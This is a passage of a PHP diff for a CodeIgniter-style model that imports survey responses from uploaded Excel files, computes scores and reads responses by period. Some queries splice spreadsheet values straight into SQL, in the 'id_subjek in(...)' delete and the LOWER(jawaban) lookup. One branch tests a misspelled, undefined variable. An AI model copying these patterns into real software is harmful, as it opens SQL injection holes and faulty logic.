+            $upx[$i]['id_periode'] = $per;
+            $upx[$i]['config_id']  = $this->config_id;
+        }
+        if (@$upx) {
+            $this->db->insert_batch('analisis_respon_hasil', $upx);
+        }
+    }
+
+    public function update_hasil($id = 0): void
+    {
+        $per = $this->analisis_master_model->get_aktif_periode();
+
+        $sql   = 'SELECT SUM(i.bobot * nilai) as jml FROM analisis_respon r LEFT JOIN analisis_indikator i ON r.id_indikator = i.id LEFT JOIN analisis_parameter z ON r.id_parameter = z.id WHERE r.id_subjek = ? AND i.act_analisis = 1 AND r.id_periode = ? ';
+        $query = $this->db->query($sql, [$id, $per]);
+        $dx    = $query->row_array();
+
+        $upx['id_master']  = $_SESSION['analisis_master'];
+        $upx['akumulasi']  = 0 + $dx['jml'];
+        $upx['id_subjek']  = $id;
+        $upx['id_periode'] = $per;
+        $upx['config_id']  = $this->config_id;
+
+        $this->config_id()
+            ->where('id_subjek', $id)
+            ->where('id_periode', $per)
+            ->delete('analisis_respon_hasil');
+        $this->db->insert('analisis_respon_hasil', $upx);
+    }
+
+    public function import_respon($op = 0)
+    {
+        $per = $this->analisis_master_model->get_aktif_periode();
+
+        $subjek = $this->subjek;
+        $mas    = $_SESSION['analisis_master'];
+        $key    = ($per + 3) * ($mas + 7) * ($subjek * 3);
+        $key    = 'AN' . $key;
+        $respon = [];
+
+        $indikator = $this->config_id()
+            ->where('id_master', $_SESSION['analisis_master'])
+            ->order_by('id')
+            ->get('analisis_indikator')
+            ->result_array();
+
+        try {
+            if ($_FILES['respon']['type'] != 'application/vnd.ms-excel') {
+                return [
+                    'success' => false,
+                    'message' => 'File yang diunggah harus berformat .xls',
+                ];
+            }
+            $data  = new SpreadsheetExcelReader($_FILES['respon']['tmp_name']);
+            $s     = 0;
+            $baris = $data->rowcount($s);
+            $kolom = $data->colcount($s);
+
+            $ketemu = 0;
+
+            for ($b = 1; $b <= $baris; $b++) {
+                for ($k = 1; $k <= $kolom; $k++) {
+                    $isi = $data->val($b, $k, $s);
+                    // ketemu njuk stop
+                    if ($isi == $key) {
+                        $br = $b + 1;
+                        $kl = $k + 1;
+
+                        $b      = $baris + 1;
+                        $k      = $kolom + 1;
+                        $ketemu = 1;
+                    }
+                }
+            }
+            if ($ketemu == 1) {
+                $dels = '';
+                $true = 0;
+
+                for ($i = $br; $i <= $baris; $i++) {
+                    $id_subjek = $data->val($i, $kl - 1, $s);
+
+                    $j = $kl;
+
+                    foreach ($indikator as $indi) {
+                        $isi = $data->val($i, $j, $s);
+                        if ($isi != '') {
+                            $true = 1;
+                        }
+
+                        $j++;
+                    }
+                    if ($true == 1) {
+                        $dels .= $id_subjek . ',';
+                        $true = 0;
+                    }
+                }
+
+                $dels .= '9999999';
+                //cek ada row
+                $this->db->where("id_subjek in({$dels})")->where('id_periode', $per)->delete('analisis_respon');
+                $dels = '';
+
+                for ($i = $br; $i <= $baris; $i++) {
+                    $id_subjek = $data->val($i, $kl - 1, $s);
+                    if (strlen($id_subjek) > 14 && $subjek == 1) {
+                        $isbj = $this->config_id()
+                            ->where('nik', $id_subjek)
+                            ->get('penduduk_hidup')
+                            ->row_array();
+                        $id_subjek = $isbj['id'];
+                    } elseif ($subject == 3) {
+                        // sasaran rumah tangga, simpan id, bukan nomor rumah tangga
+                        $id_subjek = $this->db->select('id')
+                            ->where('id_rtm', $id_subjek)
+                            ->get('tweb_rtm')
+                            ->row()
+                            ->id;
+                    }
+
+                    $j   = $kl + $op;
+                    $all = '';
+
+                    foreach ($indikator as $indi) {
+                        $isi = $data->val($i, $j, $s);
+                        if ($isi != '') {
+                            if ($indi['id_tipe'] == 1) {
+                                $param = $this->config_id()
+                                    ->where('id_indikator', $indi['id'])
+                                    ->group_start()
+                                    ->where('kode_jawaban', $isi)
+                                    ->or_where('jawaban', $isi)
+                                    ->group_end()
+                                    ->get('analisis_parameter')
+                                    ->row_array();
+
+                                if ($param) {
+                                    $in_param = $param['id'];
+                                } elseif ($isi == '') {
+                                    $in_param = 0;
+                                } else {
+                                    $in_param = -1;
+                                }
+
+                                $respon[] = [
+                                    'id_parameter' => $in_param,
+                                    'id_indikator' => $indi['id'],
+                                    'id_subjek'    => $id_subjek,
+                                    'id_periode'   => $per,
+                                ];
+                            } elseif ($indi['id_tipe'] == 2) {
+                                $this->respon_checkbox($indi, $isi, $id_subjek, $per, $respon);
+                            } else {
+                                $param = $this->config_id()
+                                    ->where('id_indikator', $indi['id'])
+                                    ->where('jawaban', $isi)
+                                    ->get('analisis_parameter')
+                                    ->row_array();
+
+                                // apakah sdh ada jawaban yg sama
+                                if ($param) {
+                                    $in_param = $param['id'];
+                                } else {
+                                    $parameter['jawaban']      = $isi;
+                                    $parameter['id_indikator'] = $indi['id'];
+                                    $parameter['asign']        = 0;
+                                    $parameter['config_id']    = $this->config_id;
+
+                                    $this->db->insert('analisis_parameter', $parameter);
+
+                                    $param = $this->config_id()
+                                        ->where('id_indikator', $indi['id'])
+                                        ->where('jawaban', $isi)
+                                        ->get('analisis_parameter')
+                                        ->row_array();
+                                    $in_param = $param['id'];
+                                }
+
+                                $respon[] = [
+                                    'id_parameter' => $in_param,
+                                    'id_indikator' => $indi['id'],
+                                    'id_subjek'    => $id_subjek,
+                                    'id_periode'   => $per,
+                                ];
+                            }
+                        }
+
+                        $j++;
+                    }
+                }
+
+                if (count($respon) > 0) {
+                    $outp = $this->db->insert_batch('analisis_respon', $respon);
+                } else {
+                    return [
+                        'success' => false,
+                        'message' => 'Tidak ada data yang diimpor',
+                    ];
+                }
+            }
+
+            $this->pre_update();
+        } catch (Exception $e) {
+            return [
+                'success' => false,
+                'pesan'   => $e->getMessage(),
+            ];
+        }
+
+        return [
+            'success' => true,
+            'message' => 'Data berhasil diimpor',
+        ];
+    }
+
+    private function respon_checkbox($indi, $isi, $id_subjek, $per, &$respon): void
+    {
+        $list_isi = explode(',', $isi);
+
+        foreach ($list_isi as $isi_ini) {
+            if ($indi['is_teks'] == 1) {
+                // Isian sebagai teks pilihan bukan kode
+                $teks  = strtolower($isi_ini);
+                $param = $this->config_id()
+                    ->where('id_indikator', $indi['id'])
+                    ->where("LOWER(jawaban) = '{$teks}'")
+                    ->get('analisis_parameter')
+                    ->row_array();
+            } else {
+                $param = $this->config_id()
+                    ->where('id_indikator', $indi['id'])
+                    ->where('kode_jawaban', $isi_ini)
+                    ->get('analisis_parameter')
+                    ->row_array();
+            }
+            if ($param['id'] != '') {
+                $in_param = $param['id'];
+                $respon[] = [
+                    'id_parameter' => $in_param,
+                    'id_indikator' => $indi['id'],
+                    'id_subjek'    => $id_subjek,
+                    'id_periode'   => $per,
+                    'config_id'    => $this->config_id,
+                ];
+            }
+        }
+    }
+
+    public function get_respon_by_id_periode($id_periode = 0, $subjek = 1)
+    {
+        $result = [];
+        if ($subjek == 1) { // Untuk Subjek Penduduk
+            $list_penduduk = $this->db
+                ->select('r.*, p.nik')
+                ->from('analisis_respon r')
+                ->join('tweb_penduduk p', 'r.id_subjek = p.id')
+                ->where('r.id_periode', $id_periode)
+                ->get()
+                ->result_array();
+
+            foreach ($list_penduduk as $penduduk) {
+                $result[$penduduk['nik']][$penduduk['id_indikator']] = $penduduk;
+            }
+        } else { // Untuk Subjek Keluarga
+            $list_keluarga = $this->db
+                ->select('r.*, k.no_kk')
+                ->from('analisis_respon r')
+                ->join('tweb_keluarga k', 'r.id_subjek = k.id')
+                ->where('r.id_periode', $id_periode)
+                ->get()
+                ->result_array();
+
+            foreach ($list_keluarga as $keluarga) {
+                $result[$keluarga['no_kk']][$keluarga['id_indikator']] = $keluarga;
+            }
+        }
+
+        return $result;
+    }
+
+    public function perbaharui($id_subjek = 0): void
+    {
+        // Daftar indikator yg menggunakan referensi
+        $id_indikator = $this->config_id()
+            ->select('id')
+            ->get_where('analisis_indikator', ['id_master' => $this->session->analisis_master])
+            ->result_array();
+
+        if ($id_indikator) {
+            $id_indikator = array_column($id_indikator, 'id');
+
+            $outp = $this->db
+                ->where('id_subjek', $id_subjek)
+                ->where_in('id_indikator', $id_indikator)
+                ->delete('analisis_respon');
+        }
+
+        status_sukses($outp);
+    }
+}
